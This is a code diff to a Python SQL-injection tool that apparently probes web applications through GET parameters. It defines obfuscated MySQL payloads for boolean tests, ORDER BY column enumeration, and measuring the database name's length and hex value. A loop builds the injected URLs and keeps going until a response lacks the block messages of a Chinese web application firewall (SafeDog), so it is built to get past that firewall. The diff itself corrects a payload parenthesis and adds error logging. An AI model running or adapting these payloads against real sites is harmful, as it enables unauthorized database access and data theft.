@@ -250,7 +250,7 @@ class Payload2(object):
     payloads1 = ["Xor True","Xor False","%26%26 true","%26%26 false"]
     payloads2 = "/**//*!order*//**/by/**/{}"
 
-    payloads3 = "%20%26%26%20(length(database/**/())={}"
+    payloads3 = "%20%26%26%20(length(database/**/())={})"
     payloads4 = "%20%26%26%20(length(hex(database/**/()))={}"
     payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"
 
@@ -447,7 +447,6 @@ class RePLace(Payload1,
         2.判断数据库长度(GET)
         """
         try:
-            result = []
             u1 = self.nurl_(url)
             url1 = u1[0]
             pars1 = u1[1]
@@ -455,23 +454,20 @@ class RePLace(Payload1,
             payloads = self.payloads3
             i = 0
             while True:
-                #/?/
-                urls = url1 + pars1 + '{}'.format(value1) + payloads.format(i)
+                urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
                 if urls:
                     print('[*]payloads5 -> '+urls)
                     self.SAVE_INFO(urls)
                 r = self.req_(urls)
                 if '安全狗' not in r and '网站防火墙' not in r:
-                    result.append(r)
-                    for res in result:
-                        if r not in res:
-                            return r
+                    if r:
+                        return r
                 
                 i += 1
             return False
-        except:
+        except Exception as e:
+            print('Error1 -> ',traceback.format_exc())
             try:
-                result = []
                 u1 = self.nurl__(url)
                 url = u1[0]
                 pars = u1[1]
@@ -480,19 +476,18 @@ class RePLace(Payload1,
                 i = 0
                 while True:    
                     for url1,pars1,value1 in zip(url,pars,value):
-                        urls = url1 + pars1 + '{}'.format(value1) + payloads.format(i)
+                        urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
                         if urls:
                             print('[*]payloads6 -> '+urls)
                         r = self.req_(urls)
                         if '安全狗' not in r and '网站防火墙' not in r:
-                            result.append(r)
-                            for res in result:
-                                if r not in res:
-                                    return r
+                            if r:
+                                return r
                     i += 1
                     
                 return False    
-            except:
+            except Exception as e:
+                print('Error2 -> ',traceback.format_exc())
                 return False
 
     # def payload2_(self):
